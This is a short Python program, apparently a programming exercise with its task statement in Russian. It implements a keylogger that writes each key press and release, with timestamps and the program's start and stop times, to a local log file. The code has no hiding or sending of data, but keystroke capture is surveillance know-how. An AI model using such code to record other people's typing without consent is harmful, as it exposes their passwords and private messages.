"""
Программа-кейлоггер для логирования
нажатий клавиш на клавиатуре

Требования:
- Необходимо учесть запись специальных клавиш,
таких как enter, space ... и добавить способ их записи
- Запись времени запуска и остановки программы
- Регистрация набираемых с клавиатуры клавиш,
времени их нажатия и освобождения
- Запись лога в файл log.txt в виде:

Program start at 01.01.2024 00:00:00
01.01.2024 00:00:00 down ‘key1’
01.01.2024 00:00:01 release ‘key1’
...
Program stop at 01.01.2024 00:00:00
"""

import keyboard
import logging
from pathlib import Path
from typing import Optional

import click


def get_logger(
    name: str,
    filename: Optional[str | Path] = None,
    verbose=True,
    datefmt="%d.%m.%Y %H:%M:%S",
) -> logging.Logger:
    logger = logging.getLogger(name)

    if verbose:
        stream_handler = logging.StreamHandler()
        stream_formatter = logging.Formatter("[%(name)-18s] %(asctime)s %(message)s", datefmt=datefmt)
        stream_handler.setFormatter(stream_formatter)
        logger.addHandler(stream_handler)

    if filename:
        Path(filename).unlink(missing_ok=True)
        file_handler = logging.FileHandler(str(filename))
        file_formatter = logging.Formatter("%(asctime)s %(message)s", datefmt=datefmt)
        file_handler.setFormatter(file_formatter)
        logger.addHandler(file_handler)

    logger.setLevel(logging.DEBUG)
    return logger


class Keylogger:
    def __init__(self, output_file=None, verbose=False, backend="keyboard"):
        self.output_file = output_file
        self.logger = get_logger(self.__class__.__name__, output_file, verbose)
        self.backend = "keyboard"

    def _log_key(self, event: keyboard.KeyboardEvent):
        self.logger.info("%s %s", event.event_type, event.name)

    def start(self) -> None:
        self.running = True
        self.logger.info("Program start")
        try:
            if self.backend == "keyboard":
                keyboard.hook(self._log_key)
                keyboard.record()
            else:
                raise NotImplementedError()
        finally:
            self.logger.info("Program stop")


@click.command()
@click.option("--output_file", type=click.Path(dir_okay=False), default="log.txt")
@click.option("--verbose", is_flag=True)
@click.option("--backend", type=click.Choice(["keyboard", ""]), default="keyboard")
def start_keylogger(**args):
    keylogger = Keylogger(**args)
    keylogger.start()


if __name__ == "__main__":
    start_keylogger()
